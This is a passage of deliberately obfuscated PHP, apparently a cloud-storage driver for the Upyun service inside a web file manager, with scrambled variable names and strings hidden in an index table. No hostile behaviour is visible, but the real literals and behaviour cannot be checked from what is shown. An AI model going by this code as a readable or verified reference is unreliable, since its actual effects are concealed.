array_slice($ÁŸÔÃÜ, 1)); } } $_file = $_SERVER[$_SERVER[Î·Ü›öğ][479]]; goto a·„´×†Ú²; A²éºÜ‹¾³: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ö‡õÒ, $¤Ìí¦ßŞ = 0) { parent::__construct(); $this->source = $ö‡õÒ; $this->sourceSize = $¤Ìí¦ßŞ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($£è¿ÔØÍ = false) { return $this->sourceSize; } public function getContent($±³şüì« = false) { return $this->fileSubstr($±³şüì«, 0, $this->sourceSize); } public function fileSubstr($‡ê¹è¿¥ = false, $şá¤ŠÇ = 0, $¼şÉá´Ö = 0) { if (!$¼şÉá´Ö) { $¼şÉá´Ö = $this->sourceSize; } $Ÿõ†‚ì = $this->sourceSize - $şá¤ŠÇ; if ($¼şÉá´Ö >= $Ÿõ†‚ì) { $¼şÉá´Ö = $Ÿõ†‚ì; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $şá¤ŠÇ, $¼şÉá´Ö); } if ($this->sourceType == self::TYPE_FILE) { if ($¼şÉá´Ö <= 0) { return $_SERVER[Î·Ü›öğ][12]; } $ã»ò·» = ftell($this->source); fseek_64($this->source, $ã»ò·» + $şá¤ŠÇ); $šÖ–¹•´ = @fread($this->source, $¼şÉá´Ö); fseek_64($this->source, $ã»ò·»); return $šÖ–¹•´; } } public function hashMd5($Ğ¥å÷ÛÑ = false) { return md5($this->getContent()); } public static function hash($…×‹”¹ö, $€à¿§Ùï = 0) { $İäåˆôï = new PathDriverStream($…×‹”¹ö, $€à¿§Ùï); return $İäåˆôï->hashSimple($…×‹”¹ö); } public static function md5($ü°Ìµ²‰, $Ÿ§¬İ¶ú = 0) { $³ü€áÊ¾ = new PathDriverStream($ü°Ìµ²‰, $Ÿ§¬İ¶ú); return $³ü€áÊ¾->hashMd5($ü°Ìµ²‰); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\x2f\166\60\x2e\141\x70\151\x2e\165\x70\x79\x75\156\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¦ë¨§èÎ) { parent::__construct(); $this->_init($¦ë¨§èÎ); } public function _init($áš®âÌÉ) { $Öè‚æáÔ =& $_SERVER[Î·Ü›öğ]; foreach ($áš®âÌÉ as $Ö¾Ì¶” => $½«µü ) { if (isset($this->{$Ö¾Ì¶”})) { $this->{$Ö¾Ì¶”} = $½«µü ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Öè‚æáÔ[1582] . LNG($Öè‚æáÔ[1502])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Æş¼ïıŞ, $¥±›¶µ = "\x47\105\124") { $È¶Ç‚Ÿä =& $_SERVER[Î·Ü›öğ]; $˜ßÍÂ¿İ = gmdate($È¶Ç‚Ÿä[1531]); $²¥›¸ú = base64_encode(hash_hmac($È¶Ç‚Ÿä[1583], "{$¥±›¶µ}\x26{$Æş¼ïıŞ}\x26{$˜ßÍÂ¿İ}", md5("{$this->userpass}"), !0)); $‰ò²¥û = array("\101\165\164\x68\x6f\162\x69\172\x61\164\x69\x6f\156\x3a\125\x50\x59\x55\116\40{$this->username}\72{$²¥›¸ú}", "\x44\141\x74\x65\x3a{$˜ßÍÂ¿İ}"); return $‰ò²¥û; } public function ussRequest($ö€À‘ùš, $Ï™¨˜ = "\x47\105\124", $ÓÄÇİ¼ = false, $Ö›©Á¿‚ = false, $“÷æ«Ûë = false) { $Æ¶íœ‡Æ =& $_SERVER[Î·Ü›öğ]; $ö€À‘ùš = trim($ö€À‘ùš, $Æ¶íœ‡Æ[8]); $üã¢µ«— = "\x2f{$this->bucket}\x2f" . rawurlencode($ö€À‘ùš); $åÜ‰Õ¡ß = $this->ussHeaders($üã¢µ«—, $Ï™¨˜); if ($Ö›©Á¿‚) { $åÜ‰Õ¡ß = array_merge($åÜ‰Õ¡ß, $Ö›©Á¿‚); } $¾ÃÍ®´ö = url_request($this->endpoint . $üã¢µ«—, $Ï™¨˜, $ÓÄÇİ¼, $åÜ‰Õ¡ß, $“÷æ«Ûë); if (!$¾ÃÍ®´ö) { $¸ûÆÑåÂ = LNG($Æ¶íœ‡Æ[1584]); $this->writeLog($¸ûÆÑåÂ); return array($Æ¶íœ‡Æ[1327] => !1, $Æ¶íœ‡Æ[1317] => $¸ûÆÑåÂ); } if (strtolower($Ï™¨˜) == $Æ¶íœ‡Æ[230] || in_array($¾ÃÍ®´ö[$Æ¶íœ‡Æ[1327]], array($Æ¶íœ‡Æ[264], $Æ¶íœ‡Æ[1585]))) { $ÓÄÇİ¼ = $¾ÃÍ®´ö[$Æ¶íœ‡Æ[1586]]; if (!$¾ÃÍ®´ö[$Æ¶íœ‡Æ[839]]) { $ÓÄÇİ¼ = isset($ÓÄÇİ¼[0]) ? $ÓÄÇİ¼[0] : $Æ¶íœ‡Æ[12]; } } else { $ÓÄÇİ¼ = json_decode($¾ÃÍ®´ö[$Æ¶íœ‡Æ[1317]], !0); if (!$ÓÄÇİ¼) { $ÓÄÇİ¼ = $¾ÃÍ®´ö[$Æ¶íœ‡Æ[1317]]; } else { if (!$¾ÃÍ®´ö[$Æ¶íœ‡Æ[839]] && isset($ÓÄÇİ¼[$Æ¶íœ‡Æ[1587]])) { $ÓÄÇİ¼ = $ÓÄÇİ¼[$Æ¶íœ‡Æ[1587]]; } } } if (!$¾ÃÍ®´ö[$Æ¶íœ‡Æ[839]]) { $this->writeLog($this->__errorMessage($ÓÄÇİ¼)); } return array($Æ¶íœ‡Æ[1327] => $¾ÃÍ®´ö[$Æ¶íœ‡Æ[839]], $Æ¶íœ‡Æ[1317] => $ÓÄÇİ¼); } private function __errorMessage($â÷€Àõ™) { $üõõ¿Ø¾ =& $_SERVER[Î·Ü›öğ]; if (!$â÷€Àõ™) { return $üõõ¿Ø¾[12]; } static $ÚéÎ§úª = null; if (!$ÚéÎ§úª) { $ÚéÎ§úª = I18n::getType(); } if ($ÚéÎ§úª != $üõõ¿Ø¾[1540]) { return $â÷€Àõ™; } $Óİ¨©¼Á = array($üõõ¿Ø¾[1588] => $üõõ¿Ø¾[1589], $üõõ¿Ø¾[1590] => $üõõ¿Ø¾[1591], $üõõ¿Ø¾[1592] => $üõõ¿Ø¾[1591], $üõõ¿Ø¾[1593] => $üõõ¿Ø¾[1594], $üõõ¿Ø¾[1595] => $üõõ¿Ø¾[1596], $üõõ¿Ø¾[1597] => $üõõ¿Ø¾[1598], $üõõ¿Ø¾[1599] => $üõõ¿Ø¾[1600]); return isset($Óİ¨©¼Á[$â÷€Àõ™]) ? $Óİ¨©¼Á[$â÷€Àõ™] : $â÷€Àõ™; } public function mkfile($š¸±Û“, $·Š‹¸©… = '', $–²ñİ£… = REPEAT_RENAME) { if ($this->setContent($š¸±Û“, $·Š‹¸©…)) { return $this->getPathOuter($š¸±Û“); } return !1; } public function mkdir($æ…çú÷, $Ö¦áÒî¬ = REPEAT_SKIP) { $Êò¬œÒæ =& $_SERVER[Î·Ü›öğ]; $™¬Ê§ç = trim($æ…çú÷, $Êò¬œÒæ[8]); if ($this->_isFolder($™¬Ê§ç)) { return $this->getPathOuter($™¬Ê§ç); } $½âºÁÇ¤ = array($Êò¬œÒæ[1601]); $°Šùòã’ = $this->ussRequest($™¬Ê§ç, $Êò¬œÒæ[291], !1, $½âºÁÇ¤); return $°Šùòã’[$Êò¬œÒæ[1327]] ? $this->getPathOuter($™¬Ê§ç) : !1; } public function copyFile($Â·ø¯, $¤„­¯ÜÑ) { $ç””™´² =& $_SERVER[Î·Ü›öğ]; $Îíó·ÓÁ = array($ç””™´²[1602] . "\57{$this->bucket}\57{$Â·ø¯}", $ç””™´²[1603]); $ˆœÀÈŒ = $this->ussRequest($¤„­¯ÜÑ, $ç””™´²[256], !1, $Îíó·ÓÁ); return $ˆœÀÈŒ[$ç””™´²[1327]] ? !0 : $this->getPathOuter($¤„­¯ÜÑ); } public function moveFile($Óò ÈÈş, $ßÂ¥‡Öö) { $…ùïå° =& $_SERVER[Î·Ü›öğ]; $šœ“Çä = array($…ùïå°[1604] . "\57{$this->bucket}\57{$Óò ÈÈş}", $…ùïå°[1603]); $÷Ş‚íœ = $this->ussRequest($ßÂ¥‡Öö, $…ùïå°[256], !1, $šœ“Çä); return $÷Ş‚íœ[$…ùïå°[1327]] ? !0 : $this->getPathOuter($ßÂ¥‡Öö); } public function delFile($µ¬¯ÓÅ) { $úÈÕğ– =& $_SERVER[Î·Ü›öğ]; $€¥ï¤” = $this->ussRequest($µ¬¯ÓÅ, $úÈÕğ–[1605]); return $€¥ï¤”[$úÈÕğ–[1327]] ? !0 : !1; } public function delFolder($ùÌ¯ŞÁ¤) { $ûªêëõï =& $_SERVER[Î·Ü›öğ]; if (!$this->exist($ùÌ¯ŞÁ¤)) { return !0; } $this->listItemCache = !1; $ÛÏÔ®ññ = $Ş¶”ôÈì = array(); $this->fileList($ùÌ¯ŞÁ¤, $ÛÏÔ®ññ, $Ş¶”ôÈì, !0); $this->listItemCache = !0; foreach ($Ş¶”ôÈì as $·Ò»ığî) { $…ş§ã¡ = $this->ussRequest($·Ò»ığî[$ûªêëõï[32]], $ûªêëõï[1605]); if (!$…ş§ã¡[$ûªêëõï[1327]]) { return !1; } } usort($ÛÏÔ®ññ, function ($…˜‡èÖ´, $§çã•™À) { $ğ¤¾å =& $_SERVER[Î·Ü›öğ]; return substr_count($§çã•™À, $ğ¤¾å[8]) - substr_count($…˜‡èÖ´, $ğ¤¾å[8]); }); foreach ($ÛÏÔ®ññ as $æ¹™¶ş) { $…ş§ã¡ = $this->ussRequest($æ¹™¶ş, $ûªêëõï[1605]); if (!$…ş§ã¡[$ûªêëõï[1327]]) { return !1; } } $…ş§ã¡ = $this->ussRequest($ùÌ¯ŞÁ¤, $ûªêëõï[1605]); return $…ş§ã¡[$ûªêëõï[1327]]; } public function rename($İ»¯İÕ, $ô¥×ìŒ¿) { if ($this->isFile($İ»¯İÕ)) { $ô¥×ìŒ¿ = get_path_father($İ»¯İÕ) . $ô¥×ìŒ¿; return $this->moveFile($İ»¯İÕ, $ô¥×ìŒ¿); } return $this->renameObject($İ»¯İÕ, $ô¥×ìŒ¿); } public function fileInfo($ŒÂ­éø, $¿çÔœƒ² = false, $ˆà¿ÑÀ = array()) { $¯¾êÉê =& $_SERVER[Î·Ü›öğ]; $ìûÂÒ¥ = array($¯¾êÉê[32] => $this->pathThis($ŒÂ­éø), $¯¾êÉê[87] => $this->getPathOuter($¯¾êÉê[8] . $ŒÂ­éø), $¯¾êÉê[33] => $¯¾êÉê[233], $¯¾êÉê[79] => isset($ˆà¿ÑÀ[$¯¾êÉê[79]]) ? $ˆà¿ÑÀ[$¯¾êÉê[79]] : 0, $¯¾êÉê[169] => $this->ext($ŒÂ­éø)); if ($¿çÔœƒ²) { return $ìûÂÒ¥; } $ìûÂÒ¥[$¯¾êÉê[234]] = $ìûÂÒ¥[$¯¾êÉê[88]] = 0; $ìûÂÒ¥[$¯¾êÉê[235]] = $ìûÂÒ¥[$¯¾êÉê[236]] = !0; if (empty($ˆà¿ÑÀ)) { $ˆà¿ÑÀ = $this->objectMeta($ŒÂ­éø); if (!$ˆà¿ÑÀ) { return $ìûÂÒ¥; } } $ìûÂÒ¥[$¯¾êÉê[234]] = intval($ˆà¿ÑÀ[$¯¾êÉê[1606]]); $ìûÂÒ¥[$¯¾êÉê[88]] = intval($ˆà¿ÑÀ[$¯¾êÉê[1607]]); $ìûÂÒ¥[$¯¾êÉê[79]] = $ˆà¿ÑÀ[$¯¾êÉê[79]]; return $ìûÂÒ¥; } public function folderInfo($œ°§é”ö, $Œ¢øÄ©ç = false) { $™ĞÜƒ‹Õ =& $_SERVER[Î·Ü›öğ]; $Æîœ¡­¤ = array($™ĞÜƒ‹Õ[32] => $this->pathThis($œ°§é”ö), $™ĞÜƒ‹Õ[87] => $this->getPathOuter($™ĞÜƒ‹Õ[8] . $œ°§é”ö), $™ĞÜƒ‹Õ[33] => $™ĞÜƒ‹Õ[78]); if ($Œ¢øÄ©ç) { return $Æîœ¡­¤; } $Æîœ¡­¤[$™ĞÜƒ‹Õ[234]] = $Æîœ¡­¤[$™ĞÜƒ‹Õ[88]] = 0; $Æîœ¡­¤[$™ĞÜƒ‹Õ[235]] = $Æîœ¡­¤[$™ĞÜƒ‹Õ[236]] = !0; if (empty($Æ×ö†ª)) { $Æ×ö†ª = $this->objectMeta($œ°§é”ö); if (!$Æ×ö†ª) { return $Æîœ¡­¤; } } $Æîœ¡­¤[$™ĞÜƒ‹Õ[234]] = intval($Æ×ö†ª[$™ĞÜƒ‹Õ[1606]]); $Æîœ¡­¤[$™ĞÜƒ‹Õ[88]] = intval($Æ×ö†ª[$™ĞÜƒ‹Õ[1607]]); return $Æîœ¡­¤; } private function listObjs($ ’ÕÅş, $ı‘¢“ß© = 0, $å·¼ŒÖÀ = 1000) { $ß¨ø¢å´ =& $_SERVER[Î·Ü›öğ]; $ç»Ö«å = array($ß¨ø¢å´[1608], $ß¨ø¢å´[1609] . $å·¼ŒÖÀ); if ($ı‘¢“ß©) { $ç»Ö«å[] = $ß¨ø¢å´[1610] . $ı‘¢“ß©; } $ı´­˜×ş = $this->ussRequest($ ’ÕÅş, $ß¨ø¢å´[1533], !1, $ç»Ö«å); return !$ı´­˜×ş[$ß¨ø¢å´[1327]] ? !1 : $ı´­˜×ş[$ß¨ø¢å´[1317]]; } private function fileList($•¹ˆÆÄ×, &$µîó‡ğå, &$Ğ÷óšƒÁ, $Ş´Óî¢ï = false) { $É„¿¯Øš =& $_SERVER[Î·Ü›öğ]; $Ñ¢û‡Ğ = $É„¿¯Øš[12]; $Äİ¯²îä = 1000; $ÍĞŒÏê = rtrim($•¹ˆÆÄ×, $É„¿¯Øš[8]) . $É„¿¯Øš[8]; while (!0) { check_abort(); $ê‰€İê¤ = $this->listObjs($•¹ˆÆÄ×, $Ñ¢û‡Ğ, $Äİ¯²îä); if (!$ê‰€İê¤) { return !1; } $Ñ¢û‡Ğ = isset($ê‰€İê¤[$É„¿¯Øš[1611]]) ? $ê‰€İê¤[$É„¿¯Øš[1611]] : $É„¿¯Øš[12]; $çÒÂÈËø = isset($ê‰€İê¤[$É„¿¯Øš[1612]]) ? $ê‰€İê¤[$É„¿¯Øš[1612]] : array(); foreach ($çÒÂÈËø as $İ¿–©‰Ò) { $Ó€¬æÌ = $İ¿–©‰Ò[$É„¿¯Øš[33]] == $É„¿¯Øš[78] ? !0 : !1; $¤Ñ·Üíæ = ltrim($ÍĞŒÏê . $İ¿–©‰Ò[$É„¿¯Øš[32]], $É„¿¯Øš[8]) . ($Ó€¬æÌ ? $É„¿¯Øš[8] : $É„¿¯Øš[12]); $ÏË„Ò¾³ = array($É„¿¯Øš[32] => $¤Ñ·Üíæ, $É„¿¯Øš[33] => $Ó€¬æÌ ? $É„¿¯Øš[78] : $É„¿¯Øš[233], $É„¿¯Øš[79] => $İ¿–©‰Ò[$É„¿¯Øš[414]], $É„¿¯Øš[1607] => $İ¿–©‰Ò[$É„¿¯Øš[1613]]); $this->cacheMethodInfoSet($¤Ñ·Üíæ, $Ó€¬æÌ, $ÏË„Ò¾³); if ($Ó€¬æÌ) { $µîó‡ğå[] = $¤Ñ·Üíæ; if ($Ş´Óî¢ï) { $this->fileList($¤Ñ·Üíæ, $µîó‡ğå, $Ğ÷óšƒÁ, $Ş´Óî¢ï); } continue; } $Ğ÷óšƒÁ[] = $ÏË„Ò¾³; } if (count($çÒÂÈËø) < $Äİ¯²îä) { break; } } $this->cacheMethodInfoSet($•¹ˆÆÄ×, !0); } public function listPath($Íé¿íâì, $Ê‚ÚÇÂÔ = false) { $¦ÇŸÖˆİ =& $_SERVER[Î·Ü›öğ]; $˜Ã×áºó = $ÍæøÛó» = array(); $this->fileList($Íé¿íâì, $˜Ã×áºó, $ÍæøÛó»); foreach ($˜Ã×áºó as $–ÂÌŸò· => $´†ÔÖì) { $˜Ã×áºó[$–ÂÌŸò·] = $this->folderInfo($´†ÔÖì, $Ê‚ÚÇÂÔ); } foreach ($ÍæøÛó» as $–ÂÌŸò· => $´†ÔÖì) { $ÍæøÛó»[$–ÂÌŸò·] = $this->fileInfo($´†ÔÖì[$¦ÇŸÖˆİ[32]], $Ê‚ÚÇÂÔ, $´†ÔÖì); } return array($¦ÇŸÖˆİ[85] => $˜Ã×áºó, $¦ÇŸÖˆİ[86] => $ÍæøÛó»); } public function has($›¸ŒÜÛ«, $§¹³Ïô = false, $ıºúŸ€‘ = true) { $¶ª·›Â‘ =& $_SERVER[Î·Ü›öğ]; $ÙœÊ†ìÇ = $¶ª·›Â‘[12]; $Ç©Û = 500; $™¢¯Ï€È = 0; $ö¢–ä› = 0; $óù¯¡ó¾ = rtrim($›¸ŒÜÛ«, $¶ª·›Â‘[8]) . $¶ª·›Â‘[8]; while (!0) { check_abort(); $® ‡è³Š = $this->listObjs($›¸ŒÜÛ«, $ÙœÊ†ìÇ, $Ç©Û); if (!$® ‡è³Š) { return !1; } $ÙœÊ†ìÇ = isset($® ‡è³Š[$¶ª·›Â‘[1611]]) ? $® ‡è³Š[$¶ª·›Â‘[1611]] : $¶ª·›Â‘[12]; $ æú¨¬ã = isset($® ‡è³Š[$¶ª·›Â‘[1612]]) ? $® ‡è³Š[$¶ª·›Â‘[1612]] : array(); if (empty($ æú¨¬ã)) { break; } $Í˜ÔÓ³ = array_filter($ æú¨¬ã, function ($½Îè» ƒ) { $À©¦ÊÓÁ =& $_SERVER[Î·Ü›öğ]; return $½Îè» ƒ[$À©¦ÊÓÁ[33]] == $À©¦ÊÓÁ[78]; }); $ ö¯û×÷ = count($ æú¨¬ã); $Í˜ÔÓ³ = count($Í˜ÔÓ³); $Œ°¹•Äñ = $ ö¯û×÷ - $Í˜ÔÓ³; if ($§¹³Ïô) { $ö¢–ä› += $Í˜ÔÓ³; $™¢¯Ï€È += $Œ°¹•Äñ; if ($ ö¯û×÷ < $Ç©Û) { break; } continue; } if ($ıºúŸ€‘) { if ($Œ°¹•Äñ) { return !0; } } else { if ($Í˜ÔÓ³) { return !0; } } if ($ ö¯û×÷ < $Ç©Û) { break; } } if ($§¹³Ïô) { return array($¶ª·›Â‘[242] => $™¢¯Ï€È, $¶ª·›Â‘[243] => $ö¢–ä›); } return !1; } public function listAll($ÅÙ´èŠ) { $«Ó©öì× =& $_SERVER[Î·Ü›öğ]; $´àëÃ³ü = $šş—‰¼õ = array(); $this->fileList($ÅÙ´èŠ, $´àëÃ³ü, $šş—‰¼õ, !0); $âÕËÇ£ = array_to_keyvalue($šş—‰¼õ, $«Ó©öì×[32]); foreach ($´àëÃ³ü as $Öì“ÔÁ) { if (is_string($Öì“ÔÁ)) { $âÕËÇ£[$Öì“ÔÁ] = array($«Ó©öì×[79] => 0); } } return $this->listAllFiles($ÅÙ´èŠ, $âÕËÇ£); } public function canRead($¿óäÔ›ù) { return $this->exist($¿óäÔ›ù) ? !0 : !1; } public function canWrite($³ºÔ€èÄ) { return $this->exist($³ºÔ€èÄ) ? !0 : !1; } public function getContent($×ØËı¡) { return $this->fileSubstr($×ØËı¡, 0, -1); } public function setContent($Ò‹¼ìª†, $âÌÔÓ°× = '') { $™¢Íúøü =& $_SERVER[Î·Ü›öğ]; if (!$âÌÔÓ°×) { $¥öÒ±ì‘ = $this->ussRequest($Ò‹¼ìª†, $™¢Íúøü[291]); return $¥öÒ±ì‘[$™¢Íúøü[1327]]; } $¨Õã€ëñ = $this->tempFile($this->pathThis($Ò‹¼ìª†)); file_put_contents($¨Õã€ëñ, $âÌÔÓ°×); if ($this->upload($Ò‹¼ìª†, $¨Õã€ëñ)) { $this->tempFileRemve($¨Õã€ëñ); return !0; } return !1; } public function fileSubstr($ŒüÓ›Ø®, $Áµ•Æ’…, $ù¢·…›) { $éˆ÷ÂÎ =& $_SERVER[Î·Ü›öğ]; if (!($şß¡ˆÊ– = $this->link($ŒüÓ›Ø®))) { return !1; } $æÏ¶ÑİÊ = !1; if ($ù¢·…› > 0) { $–á¬…áÇ = $Áµ•Æ’… + $ù¢·…› - 1; $æÏ¶ÑİÊ = array($éˆ÷ÂÎ[1572] . $Áµ•Æ’… . $éˆ÷ÂÎ[464] . $–á¬…áÇ); } $¤õŞŠ = url_request($şß¡ˆÊ–, $éˆ÷ÂÎ[1533], !1, $æÏ¶ÑİÊ); return $¤õŞŠ[$éˆ÷ÂÎ[839]] ? $¤õŞŠ[$éˆ÷ÂÎ[1317]] : !1; } public function upload($ì—à²ˆ¾, $Ë¿˜ıº¹, $±àü˜öÓ = false, $‹·£˜ıæ = REPEAT_REPLACE) { $ºóåùµ =& $_SERVER[Î·Ü›öğ]; $áŒ  ¾¢ = IO::size($Ë¿˜ıº¹); if ($áŒ  ¾¢ <= 1024 * 1024 * 200) { $•…şÃ¹ı = array($ºóåùµ[1614] . $Ë¿˜ıº¹); $šº˜¬ò… = $this->ussRequest($ì—à²ˆ¾, $ºóåùµ[256], $•…şÃ¹ı); return $šº˜¬ò…[$ºóåùµ[1327]] ? $this->getPathOuter($ì—à²ˆ¾) : !1; } $èˆîŠ—Â = 1024 * 1024 * 10; $”Ø¸‚Ä„ = array($ºóåùµ[1615], $ºóåùµ[1616] . $áŒ  ¾¢, $ºóåùµ[1617], $ºóåùµ[1618] . $èˆîŠ—Â); $šº˜¬ò… = $this->ussRequest($ì—à²ˆ¾, $ºóåùµ[256], !1, $”Ø¸‚Ä„); if (!$šº˜¬ò…[$ºóåùµ[1327]]) { return !1; } $Ä»Ã íä = $šº˜¬ò…[$ºóåùµ[1317]]; $ğœÃ½á¶ = 0; $Í„˜İºŞ = $Ä»Ã íä[$ºóåùµ[1619]]; $¢ş¤Á = fopen($Ë¿˜ıº¹, $ºóåùµ[1496]); if (!$¢ş¤Á) { return !1; } do { $îÅ¹üÓÉ = $Ä»Ã íä[$ºóåùµ[1620]]; fseek_64($¢ş¤Á, $ğœÃ½á¶); $¿Ê”Ÿ† = fread($¢ş¤Á, $îÅ¹üÓÉ); $Çúâƒ = 0; do { $Çúâƒ++; $Ä»Ã íä = $this->uploadPart($ì—à²ˆ¾, $Ä»Ã íä, $¿Ê”Ÿ†); } while (!$Ä»Ã íä && $Çúâƒ < 3); if (!$Ä»Ã íä) { return !1; } $Í„˜İºŞ = $Ä»Ã íä[$ºóåùµ[1619]]; $ğœÃ½á¶ += $îÅ¹üÓÉ; } while ($Í„˜İºŞ != -1); fclose($¢ş¤Á); $”Ø¸‚Ä„ = array($ºóåùµ[1621], $ºóåùµ[1622] . $Ä»Ã íä[$ºóåùµ[1623]], $ºóåùµ[1617]); $šº˜¬ò… = $this->ussRequest($ì—à²ˆ¾, $ºóåùµ[256], !1, $”Ø¸‚Ä„); return $šº˜¬ò…[$ºóåùµ[1327]] ? $this->getPathOuter($äßíÂà™) : !1; } private function uploadPart($£ğä„¶ƒ, $¥î»ŞõÚ, &$®ÄŠó‘º) { $·Æ—–¾‚ =& $_SERVER[Î·Ü›öğ]; $íÊº‹öÍ = array($·Æ—–¾‚[1624], $·Æ—–¾‚[1622] . $¥î»ŞõÚ[$·Æ—–¾‚[1623]], $·Æ—–¾‚[1625] . $¥î»ŞõÚ[$·Æ—–¾‚[1619]], $·Æ—–¾‚[146] . $¥î»ŞõÚ[$·Æ—–¾‚[1620]]); $ÛÂş»‹ñ = $this->ussRequest($£ğä„¶ƒ, $·Æ—–¾‚[256], $®ÄŠó‘º, $íÊº‹öÍ); return !$ÛÂş»‹ñ[$·Æ—–¾‚[1327]] ? $ÛÂş»‹ñ[$·Æ—–¾‚[1327]] : $ÛÂş»‹ñ[$·Æ—–¾‚[1317]]; } public function uploadFormData($±ŒØ²ø, $‰Äé´¸Ö = 3600) { return $this->uploadPolicy($±ŒØ²ø, $‰Äé´¸Ö); } public function uploadMultiData($Ç­ˆ˜ÍÅ, $ˆ¯á¦À = 3600) { $Ù¥Ş–¯ñ =& $_SERVER[Î·Ü›öğ]; $Òä°©¨Ó = (int) $GLOBALS[$Ù¥Ş–¯ñ[7]][$Ù¥Ş–¯ñ[79]]; return $this->uploadPolicy($Ç­ˆ˜ÍÅ, $ˆ¯á¦À, $Òä°©¨Ó); } private function uploadPolicy($½ˆµ¹‚“, $Şı’í = 3600, $µÜùğ = 0) { $°ú½°Ê³ =& $_SERVER[Î·Ü›öğ]; $ŒÀ¬åú… = $°ú½°Ê³[8] . $this->bucket; $Ú­õŸ§ = gmdate($°ú½°Ê³[1531]); $é¹õÂÏ¬ = array($°ú½°Ê³[1626] => $this->bucket, $°ú½°Ê³[1627] => $½ˆµ¹‚“, $°ú½°Ê³[1628] => time() + $Şı’í, $°ú½°Ê³[1629] => $Ú­õŸ§); if ($µÜùğ) { $é¹õÂÏ¬[$°ú½°Ê³[1516]] = $µÜùğ; } $ø÷£˜¿ = base64_encode(json_encode($é¹õÂÏ¬)); $‰«üı£û = base64_encode(hash_hmac($°ú½°Ê³[1583], "\x50\x4f\x53\124\x26{$ŒÀ¬åú…}\46{$Ú­õŸ§}\x26{$ø÷£˜¿}", md5("{$this->userpass}"), !0)); $îïÌ¿ä = array($°ú½°Ê³[280] => $ø÷£˜¿, $°ú½°Ê³[1630] => "\x55\120\131\125\x4e\x20{$this->username}\x3a{$‰«üı£û}", $°ú½°Ê³[209] => $this->endpoint . $ŒÀ¬åú…); return $îïÌ¿ä; } public function download($ê‚êŠçÄ, $Ó«‹í‰Å) { $´Îı Åí = IO::getPathInner(IO::mkfile($Ó«‹í‰Å)); if (!($²¬›ğŸœ = $this->link($ê‚êŠçÄ))) { return !1; } $À­Ğé‚’ = 0; $ ‚£­İï = 1024 * 200; $İìüğ¯ı = fopen($´Îı Åí, $_SERVER[Î·Ü›öğ][1578]); while (!0) { $Õ…¹±Ö = $this->fileSubstr($ê‚êŠçÄ, $À­Ğé‚’, $ ‚£­İï); if ($Õ…¹±Ö === !1) { return !1; } fwrite($İìüğ¯ı, $Õ…¹±Ö); $À­Ğé‚’ += $ ‚£­İï; if (strlen($Õ…¹±Ö) < $ ‚£­İï) { break; } } fclose($İìüğ¯ı); return $Ó«‹í‰Å; } public function link($×ÍòÙ­œ, $¶¨úˆ´ = array()) { $ ƒÄÛ­ö =& $_SERVER[Î·Ü›öğ]; $×ÍòÙ­œ = trim($×ÍòÙ­œ, $ ƒÄÛ­ö[8]); if (!empty($this->token)) { $îÉÖÕšŠ = strtotime(date($ ƒÄÛ­ö[1631])); $®óÇò´Š = substr(md5($this->token . $ ƒÄÛ­ö[287] . $îÉÖÕšŠ . $ ƒÄÛ­ö[1632] . $×ÍòÙ­œ), 12, 8) . $îÉÖÕšŠ; $¶¨úˆ´[] = $ ƒÄÛ­ö[1633] . $®óÇò´Š; } $¹õöÛÀô = !empty($¶¨úˆ´) ? $ ƒÄÛ­ö[76] . implode($ ƒÄÛ­ö[287], $¶¨úˆ´) : $ ƒÄÛ­ö[12]; return $this->getHost() . $ ƒÄÛ­ö[8] . $this->pathEncode($×ÍòÙ­œ) . $¹õöÛÀô; } public function fileOut($É‰ÃèşŞ, $íµ™–ò¬ = false, $»šØ µÆ = false, $³à‹êÔİ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($É‰ÃèşŞ, $íµ™–ò¬, $»šØ µÆ, $³à‹êÔİ); } if (!$»šØ µÆ) { $»šØ µÆ = $this->pathThis($É‰ÃèşŞ); } $Ô£Ò¢÷š = $íµ™–ò¬ ? array($_SERVER[Î·Ü›öğ][1634] . rawurlencode($»šØ µÆ)) : array(); $¢‹Éì¬Ô = $this->link($É‰ÃèşŞ, $Ô£Ò¢÷š); $this->fileOutLink($¢‹Éì¬Ô); } public function fileOutServer($úòç€¢•, $ø­â®úº = false, $ÍîŠÛ«ß = false, $ç¨‚ûæ£ = '') { parent::fileOut($úòç€¢•, $ø­â®úº, $ÍîŠÛ«ß, $ç¨‚ûæ£); } public function fileOutImage($Ş’–Õè¦, $üÄ´šÜ® = 250) { $Ç¯Ş©ã = $this->link($Ş’–Õè¦ . $_SERVER[Î·Ü›öğ][1635] . $üÄ´šÜ®); $this->fileOutLink($Ç¯Ş©ã); } public function fileOutImageServer($öÍØşıÊ, $²ìŠå»Ş = 250) { parent::fileOutImage($öÍØşıÊ, $²ìŠå»Ş); } public function hashMd5($»Ğœ´‡·) { $¥›Ä©¥Î =& $_SERVER[Î·Ü›öğ]; $…ÉÌœ³ = $this->_objectMeta($»Ğœ´‡·); return isset($…ÉÌœ³[$¥›Ä©¥Î[248]]) ? $…ÉÌœ³[$¥›Ä©¥Î[248]] : !1; } public function size($æı¬Ç‹Ş) { $¦éîÍšä = $this->objectMeta($æı¬Ç‹Ş); return $¦éîÍšä ? $¦éîÍšä[$_SERVER[Î·Ü›öğ][79]] : 0; } public function info($ÅË¤ŒÛ) { if ($this->isFolder($ÅË¤ŒÛ)) { return $this->folderInfo($ÅË¤ŒÛ); } else { if ($this->isFile($ÅË¤ŒÛ)) { return $this->fileInfo($ÅË¤ŒÛ); } } return !1; } public function exist($ïÙˆŒš›) { return $this->isFile($ïÙˆŒš›) || $this->isFolder($ïÙˆŒš›); } public function isFile($ ©âî¢) { return !$this->isFolder($ ©âî¢) && $this->objectMeta($ ©âî¢); } public function isFolder($üÁ¼ ŠÍ) { return $this->cacheMethod($_SERVER[Î·Ü›öğ][180], $üÁ¼ ŠÍ); } protected function objectMeta($±ì¥µ»à) { return 